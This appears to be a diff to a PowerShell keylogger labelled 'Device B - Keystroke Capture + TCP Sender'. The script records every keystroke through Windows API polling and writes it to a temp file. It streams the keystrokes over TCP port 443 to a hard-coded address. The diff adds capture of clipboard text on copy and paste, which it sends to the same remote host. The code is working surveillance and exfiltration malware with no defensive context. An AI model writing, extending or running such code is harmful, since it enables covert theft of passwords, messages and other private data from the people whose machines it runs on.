@@ -1,9 +1,12 @@
 # Device B - Keystroke Capture + TCP Sender
-$deviceAIP = "172.17.2.85"   
+$deviceAIP = "172.17.2.85"
 
 # Setup temp file
 $path = "$env:temp\testing.txt"
 if ((Test-Path $path) -eq $false) { New-Item $path }
+
+# Load clipboard support
+Add-Type -AssemblyName System.Windows.Forms
 
 # Load Windows API
 $signatures = @(
@@ -23,7 +26,6 @@ if (-not ("API.Win32" -as [type])) {
     $API = [API.Win32]
 }
 
-
 # Connect to Device A
 function New-Connection {
     $c = New-Object System.Net.Sockets.TcpClient($deviceAIP, 443)
@@ -33,14 +35,53 @@ function New-Connection {
 }
 
 $client, $writer = New-Connection
+$lastClipboard = ""
 
 try {
     while ((Test-Path $path) -ne $false) {
         Start-Sleep -Milliseconds 40
 
+        # Check if Ctrl is held
+        $ctrlHeld = ($API::GetAsyncKeyState(17) -band 0x8000) -ne 0
+
         for ($ascii = 9; $ascii -le 254; $ascii++) {
             $state = $API::GetAsyncKeyState($ascii)
             if ($state -eq -32767) {
+
+                # Detect Ctrl+C (copy)
+                if ($ctrlHeld -and $ascii -eq 67) {
+                    Start-Sleep -Milliseconds 100
+                    $copied = [System.Windows.Forms.Clipboard]::GetText()
+                    if ($copied -and $copied -ne $lastClipboard) {
+                        $lastClipboard = $copied
+                        $alert = "`n[[ CLIPBOARD COPIED: $copied ]]`n"
+                        [System.IO.File]::AppendAllText($path, $alert, [System.Text.Encoding]::Unicode)
+                        try { $writer.Write($alert) }
+                        catch {
+                            try { $client.Close() } catch {}
+                            $client, $writer = New-Connection
+                            $writer.Write($alert)
+                        }
+                    }
+                    continue
+                }
+
+                # Detect Ctrl+V (paste)
+                if ($ctrlHeld -and $ascii -eq 86) {
+                    $pasted = [System.Windows.Forms.Clipboard]::GetText()
+                    if ($pasted) {
+                        $alert = "`n[[ CLIPBOARD PASTED: $pasted ]]`n"
+                        [System.IO.File]::AppendAllText($path, $alert, [System.Text.Encoding]::Unicode)
+                        try { $writer.Write($alert) }
+                        catch {
+                            try { $client.Close() } catch {}
+                            $client, $writer = New-Connection
+                            $writer.Write($alert)
+                        }
+                    }
+                    continue
+                }
+
                 $null = [console]::CapsLock
                 $virtualKey   = $API::MapVirtualKey($ascii, 3)
                 $kbstate      = New-Object -TypeName Byte[] -ArgumentList 256
@@ -49,7 +90,7 @@ try {
                 $success      = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
                 if ($success -and (Test-Path $path) -eq $true) {
-                    # Write to file (original behaviour)
+                    # Write to file
                     [System.IO.File]::AppendAllText($path, $mychar, [System.Text.Encoding]::Unicode)
 
                     # Send to Device A
@@ -61,7 +102,6 @@ try {
                         }
                     }
                     catch {
-                        # Reconnect if connection dropped and retry
                         try { $client.Close() } catch {}
                         $client, $writer = New-Connection
                         if ($ascii -eq 13) {
